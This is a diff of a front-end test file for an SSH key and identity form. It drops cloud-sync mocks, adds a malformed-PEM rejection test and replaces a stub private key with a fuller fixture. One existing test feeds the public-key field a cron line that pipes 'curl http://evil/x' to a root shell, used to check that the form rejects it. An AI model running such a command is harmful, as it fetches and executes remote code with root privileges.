@@ -11,8 +11,6 @@ const h = vi.hoisted(() => ({
   teams: [] as { id: string }[],
   isPinned: false,
   nextPersonalPinValue: vi.fn((_source: string) => true),
-  toggleExcluded: vi.fn(),
-  isObjectSynced: vi.fn(() => true),
   contributions: [] as unknown[],
   defaultVaultId: "personal",
   secrets: {} as Record<string, string>,
@@ -70,9 +68,6 @@ vi.mock("@/stores/teamStore", () => ({
     },
     { getState: () => ({ teams: h.teams, membersByTeam: {}, rolesByTeam: {} }) },
   ),
-}));
-vi.mock("@/stores/syncPrefsStore", () => ({
-  useSyncPrefsStore: () => ({ toggleExcluded: h.toggleExcluded, isObjectSynced: h.isObjectSynced }),
 }));
 vi.mock("@/stores/shortcutStore", () => ({ getShortcutHint: () => "Del" }));
 vi.mock("@/hooks/useUIContributions", () => ({ useUIContributions: () => h.contributions }));
@@ -150,7 +145,6 @@ beforeEach(() => {
   h.contributions = [];
   h.defaultVaultId = "personal";
   vi.clearAllMocks();
-  h.isObjectSynced.mockReturnValue(true);
   h.derivePublicKey.mockResolvedValue({ error: "invalid" as const });
 });
 afterEach(() => cleanup());
@@ -214,11 +208,9 @@ test.each([
 test.each([
   ["key", renderKey],
   ["identity", renderIdentity],
-])("%s form's actions menu carries the sync toggle and the delete row", (_kind, mount) => {
-  h.isObjectSynced.mockReturnValue(false);
+])("%s form's actions menu carries the delete row", (_kind, mount) => {
   mount({ initial: (_kind === "key" ? key() : identity()) as never, onDelete: vi.fn() });
   const labels = document.querySelector("[data-actions-menu]")!.getAttribute("data-labels")!.split("|");
-  expect(labels).toContain("keychain.common.enableCloudSync");
   expect(labels).toContain("common.action.delete");
 });
 
@@ -251,7 +243,7 @@ test.each([
 test("the key form submits the typed material with a generated default name", async () => {
   const { onSubmit, flushRef } = renderKey();
   const priv = document.querySelectorAll("textarea")[0];
-  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
+  fireEvent.change(priv, { target: { value: VALID_OPENSSH_PRIVATE } });
   fireEvent.click(document.querySelector("[data-tag-selector]")!);
   await act(async () => {
     flushRef.current!();
@@ -314,7 +306,7 @@ const VALID_PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 kipavy@laptop";
 test("the key form refuses to save a public half that is not an SSH public key", async () => {
   const { onSubmit, flushRef } = renderKey();
   const [priv, pub] = Array.from(document.querySelectorAll("textarea"));
-  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
+  fireEvent.change(priv, { target: { value: VALID_OPENSSH_PRIVATE } });
   fireEvent.change(pub, { target: { value: "* * * * * root curl http://evil/x|sh" } });
   await act(async () => {
     flushRef.current!();
@@ -329,7 +321,7 @@ test("the key form refuses to save a public half that is not an SSH public key",
 test("the key form saves once the public half is corrected", async () => {
   const { onSubmit, flushRef } = renderKey();
   const [priv, pub] = Array.from(document.querySelectorAll("textarea"));
-  fireEvent.change(priv, { target: { value: "-----BEGIN OPENSSH PRIVATE KEY-----\nx" } });
+  fireEvent.change(priv, { target: { value: VALID_OPENSSH_PRIVATE } });
   fireEvent.change(pub, { target: { value: "not a key" } });
   await act(async () => {
     flushRef.current!();
@@ -344,16 +336,36 @@ test("the key form saves once the public half is corrected", async () => {
   expect(screen.queryByText("keychain.keyForm.invalidPublicKey")).toBeNull();
 });
 
-const COMPLETE_PRIV = "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----";
+test("the key form refuses malformed legacy PEM before saving", async () => {
+  const { onSubmit, flushRef } = renderKey();
+  const [priv] = Array.from(document.querySelectorAll("textarea"));
+  fireEvent.change(priv, {
+    target: {
+      value: "-----BEGIN RSA PRIVATE KEY-----\nnot-base64!\n-----END RSA PRIVATE KEY-----",
+    },
+  });
+  await act(async () => {
+    flushRef.current!();
+  });
+
+  expect(onSubmit).not.toHaveBeenCalled();
+  expect(screen.getByText("Malformed private key")).toBeTruthy();
+});
+
+const VALID_OPENSSH_PRIVATE = [
+  "-----BEGIN OPENSSH PRIVATE KEY-----",
+  "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAADwAAAAtzc2gtZWQyNTUxOQAAAAEA",
+  "-----END OPENSSH PRIVATE KEY-----",
+].join("\n");
 
 test("the key form derives the public half of a private-only import and saves it", async () => {
   h.derivePublicKey.mockResolvedValue({ publicKey: VALID_PUB } as never);
   const { onSubmit, flushRef } = renderKey();
   const [priv, pub] = Array.from(document.querySelectorAll("textarea")) as HTMLTextAreaElement[];
   await act(async () => {
-    fireEvent.change(priv, { target: { value: COMPLETE_PRIV } });
+    fireEvent.change(priv, { target: { value: VALID_OPENSSH_PRIVATE } });
   });
-  expect(h.derivePublicKey).toHaveBeenCalledWith(COMPLETE_PRIV, "");
+  expect(h.derivePublicKey).toHaveBeenCalledWith(VALID_OPENSSH_PRIVATE, "");
   expect(pub.value).toBe(VALID_PUB);
   await act(async () => {
     flushRef.current!();
@@ -367,7 +379,7 @@ test("the key form never overwrites a public half the user pasted", async () => 
   const [priv, pub] = Array.from(document.querySelectorAll("textarea")) as HTMLTextAreaElement[];
   await act(async () => {
     fireEvent.change(pub, { target: { value: VALID_PUB } });
-    fireEvent.change(priv, { target: { value: COMPLETE_PRIV } });
+    fireEvent.change(priv, { target: { value: VALID_OPENSSH_PRIVATE } });
   });
   expect(h.derivePublicKey).not.toHaveBeenCalled();
   expect(pub.value).toBe(VALID_PUB);
@@ -378,7 +390,7 @@ test("the key form leaves the public half empty when the private one cannot be r
   const { onSubmit, flushRef } = renderKey();
   const [priv, pub] = Array.from(document.querySelectorAll("textarea")) as HTMLTextAreaElement[];
   await act(async () => {
-    fireEvent.change(priv, { target: { value: COMPLETE_PRIV } });
+    fireEvent.change(priv, { target: { value: VALID_OPENSSH_PRIVATE } });
   });
   expect(pub.value).toBe("");
   await act(async () => {
@@ -395,7 +407,7 @@ test("the identity form derives the public half of inline key material too", asy
   fireEvent.click(screen.getByText("keychain.identityForm.newKeyInline"));
   const textareas = Array.from(document.querySelectorAll("textarea")) as HTMLTextAreaElement[];
   await act(async () => {
-    fireEvent.change(textareas[textareas.length - 2], { target: { value: COMPLETE_PRIV } });
+    fireEvent.change(textareas[textareas.length - 2], { target: { value: VALID_OPENSSH_PRIVATE } });
   });
   expect(textareas[textareas.length - 1].value).toBe(VALID_PUB);
 });
